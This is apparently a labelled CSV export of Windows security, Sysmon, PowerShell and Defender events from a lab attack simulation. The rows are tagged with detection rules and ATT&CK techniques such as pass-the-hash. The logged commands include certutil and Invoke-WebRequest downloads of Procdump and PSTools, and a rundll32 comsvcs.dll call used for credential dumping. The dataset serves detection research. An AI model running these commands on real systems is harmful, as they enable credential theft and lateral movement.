4141,Attack Step 1,"May 9, 2025 @ 15:19:30.697",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4142,Attack Step 1,"May 9, 2025 @ 15:19:55.180",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4143,Attack Step 1,"May 9, 2025 @ 15:19:55.198",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4144,Attack Step 1,"May 9, 2025 @ 15:19:55.198",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4145,Attack Step 1,"May 9, 2025 @ 15:21:03.462",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4146,Attack Step 1,"May 9, 2025 @ 15:21:03.509",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4147,Attack Step 1,"May 9, 2025 @ 15:21:03.510",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4148,Attack Step 1,"May 9, 2025 @ 15:22:03.294",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler",,3,67027,A process was created.,,,
4149,Attack Step 2,"May 9, 2025 @ 15:24:01.640",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4150,Attack Step 2,"May 9, 2025 @ 15:24:01.646",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4151,Attack Step 2,"May 9, 2025 @ 15:24:01.772",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wsmprovhost.exe -Embedding,,3,67027,A process was created.,,,
4152,Attack Step 2,"May 9, 2025 @ 15:24:04.377",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,15,92213,Executable file dropped in folder commonly used by malware,[T1105],[Command and Control],[Ingress Tool Transfer]
4153,Attack Step 2,"May 9, 2025 @ 15:25:14.025",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4154,Attack Step 2,"May 9, 2025 @ 15:25:14.035",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4155,Attack Step 2,"May 9, 2025 @ 15:25:34.158",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4156,Attack Step 2,"May 9, 2025 @ 15:25:34.167",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4157,Attack Step 2,"May 9, 2025 @ 15:26:03.134",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,,3,67027,A process was created.,,,
4158,Attack Step 2,"May 9, 2025 @ 15:26:03.151",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4159,Attack Step 2,"May 9, 2025 @ 15:26:03.178",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4160,Attack Step 2,"May 9, 2025 @ 15:26:03.236",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4161,Attack Step 2,"May 9, 2025 @ 15:26:14.101",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4162,Attack Step 2,"May 9, 2025 @ 15:26:14.108",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4163,Attack Step 2,"May 9, 2025 @ 15:26:20.415",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91815,Powershell executing process discovery,[T1057],[Discovery],[Process Discovery]
4164,Attack Step 2,"May 9, 2025 @ 15:26:30.759",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoUsoCoreWorker.exe\"" useprivatenamespaces",,3,67027,A process was created.,,,
4165,Attack Step 2,"May 9, 2025 @ 15:26:30.769",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4166,Attack Step 2,"May 9, 2025 @ 15:26:30.786",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4167,Attack Step 2,"May 9, 2025 @ 15:26:30.787",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4168,Attack Step 2,"May 9, 2025 @ 15:26:30.795",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4169,Attack Step 2,"May 9, 2025 @ 15:26:31.890",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4170,Attack Step 2,"May 9, 2025 @ 15:27:18.461",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4171,Attack Step 2,"May 9, 2025 @ 15:27:18.469",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4172,Attack Step 2,"May 9, 2025 @ 15:27:18.475",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\rundll32.exe\"" C:\\Windows\\System32\\comsvcs.dll",,3,67027,A process was created.,,,
4173,Attack Step 2,"May 9, 2025 @ 15:27:42.928",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4174,Attack Step 2,"May 9, 2025 @ 15:27:42.956",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4175,Attack Step 2,"May 9, 2025 @ 15:28:46.036",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler",,3,67027,A process was created.,,,
4176,Attack Step 2,"May 9, 2025 @ 15:29:07.644",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4177,Attack Step 2,"May 9, 2025 @ 15:29:07.679",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4178,Attack Step 2,"May 9, 2025 @ 15:29:41.347",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\certutil.exe\"" -urlcache -split -f https://download.sysinternals.com/files/Procdump.zip procdump.zip",,3,67027,A process was created.,,,
4179,Attack Step 2,"May 9, 2025 @ 15:29:41.367",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4180,Attack Step 2,"May 9, 2025 @ 15:29:41.399",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4181,Attack Step 2,"May 9, 2025 @ 15:29:41.916",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1116,3168,Trojan:Win32/Ceprolad.A,,,,,,,,,,12,62123,Windows Defender: Antimalware platform detected  potentially unwanted software (),,,
4182,Attack Step 2,"May 9, 2025 @ 15:29:42.002",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1116,3168,Trojan:Win32/Ceprolad.A,,,,,,,,,,12,62123,Windows Defender: Antimalware platform detected  potentially unwanted software (),,,
4183,Attack Step 2,"May 9, 2025 @ 15:29:42.060",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\certutil.exe\"" \""C:\\WINDOWS\\system32\\certutil.exe\"" -urlcache -split -f https://download.sysinternals.com/files/Procdump.zip procdump.zip",,3,67027,A process was created.,,,
4184,Attack Step 2,"May 9, 2025 @ 15:29:45.309",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\smartscreen.exe -Embedding,,3,67027,A process was created.,,,
4185,Attack Step 2,"May 9, 2025 @ 15:29:45.991",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\certutil.exe\"" -urlcache -split -f https://download.sysinternals.com/files/Procdump.zip procdump.zip",,3,67027,A process was created.,,,
4186,Attack Step 2,"May 9, 2025 @ 15:29:45.991",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\AUDIODG.EXE 0x000000000000044C 0x000000000000046C,,3,67027,A process was created.,,,
4187,Attack Step 2,"May 9, 2025 @ 15:29:49.424",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4188,Attack Step 2,"May 9, 2025 @ 15:29:49.436",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4189,Attack Step 2,"May 9, 2025 @ 15:29:49.446",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4190,Attack Step 2,"May 9, 2025 @ 15:29:49.454",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4191,Attack Step 2,"May 9, 2025 @ 15:29:49.479",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4192,Attack Step 2,"May 9, 2025 @ 15:29:49.484",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4193,Attack Step 2,"May 9, 2025 @ 15:29:52.144",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4194,Attack Step 2,"May 9, 2025 @ 15:29:52.144",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,2010,3168,,,,,,,,,,,3,62138,Windows Defender: Antimalware engine used Dynamic Signature Service to get additional definitions,,,
4195,Attack Step 2,"May 9, 2025 @ 15:30:12.089",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,,3,67027,A process was created.,,,
4196,Attack Step 2,"May 9, 2025 @ 15:30:12.134",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4197,Attack Step 2,"May 9, 2025 @ 15:30:12.146",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4198,Attack Step 2,"May 9, 2025 @ 15:30:12.146",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4199,Attack Step 2,"May 9, 2025 @ 15:30:12.149",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4200,Attack Step 2,"May 9, 2025 @ 15:30:16.779",15,10.12.25.3,Windows11,System,7040,844,,,,,,,,,,,3,61104,Service startup type was changed,,,
4201,Attack Step 2,"May 9, 2025 @ 15:30:17.893",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1117,3168,Trojan:Win32/Ceprolad.A,,,,,,,,,,3,62124,Windows Defender: Antimalware platform performed an action to protect you from potentially unwanted software (),,,
4202,Attack Step 2,"May 9, 2025 @ 15:30:24.072",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4203,Attack Step 2,"May 9, 2025 @ 15:30:24.091",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4204,Attack Step 2,"May 9, 2025 @ 15:30:28.101",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4103,5184,,,,,,,,,,"CommandInvocation(Invoke-WebRequest): \""Invoke-WebRequest\""  ParameterBinding(Invoke-WebRequest): name=\""Uri\""; value=\""https://download.sysinternals.com/files/PSTools.zip\""  ParameterBinding(Invoke-WebRequest): name=\""OutFile\""; value=\""C:\\Users\\Public\\PSTools.zip\""",5,100206,"Invoke Webrequest executed, possible download cradle detected.",[T1059.001],[Execution],[PowerShell]
4205,Attack Step 2,"May 9, 2025 @ 15:30:28.133",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe2_ Global\\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4206,Attack Step 2,"May 9, 2025 @ 15:30:48.011",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,,3,67027,A process was created.,,,
4207,Attack Step 2,"May 9, 2025 @ 15:30:48.019",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.27777.1008-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,,3,67027,A process was created.,,,
4208,Attack Step 2,"May 9, 2025 @ 15:30:58.591",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4209,Attack Step 2,"May 9, 2025 @ 15:30:58.591",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4210,Attack Step 2,"May 9, 2025 @ 15:31:02.044",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4103,5184,,,,,,,,,,"CommandInvocation(Invoke-WebRequest): \""Invoke-WebRequest\""  ParameterBinding(Invoke-WebRequest): name=\""Uri\""; value=\""https://download.sysinternals.com/files/PSTools.zip\""  ParameterBinding(Invoke-WebRequest): name=\""OutFile\""; value=\""C:\\Users\\Public\\PSTools3.zip\""",5,100206,"Invoke Webrequest executed, possible download cradle detected.",[T1059.001],[Execution],[PowerShell]
4211,Attack Step 2,"May 9, 2025 @ 15:31:28.928",15,10.12.25.3,Windows11,Microsoft-Windows-PowerShell/Operational,4104,5184,,,,,,,,,,,4,91811,"Powershell script executed ""Expand-Archive""",[T1105],[Command and Control],[Ingress Tool Transfer]
4212,Attack Step 2,"May 9, 2025 @ 15:31:30.273",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4213,Attack Step 2,"May 9, 2025 @ 15:31:30.317",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4214,Attack Step 2,"May 9, 2025 @ 15:31:30.370",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4215,Attack Step 2,"May 9, 2025 @ 15:31:30.413",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4216,Attack Step 2,"May 9, 2025 @ 15:31:30.424",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4217,Attack Step 2,"May 9, 2025 @ 15:31:30.467",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4218,Attack Step 2,"May 9, 2025 @ 15:31:30.526",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4219,Attack Step 2,"May 9, 2025 @ 15:31:30.530",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4220,Attack Step 2,"May 9, 2025 @ 15:31:30.595",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4221,Attack Step 2,"May 9, 2025 @ 15:31:30.649",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4222,Attack Step 2,"May 9, 2025 @ 15:31:30.670",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4223,Attack Step 2,"May 9, 2025 @ 15:31:30.697",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4224,Attack Step 2,"May 9, 2025 @ 15:31:30.745",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4225,Attack Step 2,"May 9, 2025 @ 15:31:30.753",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
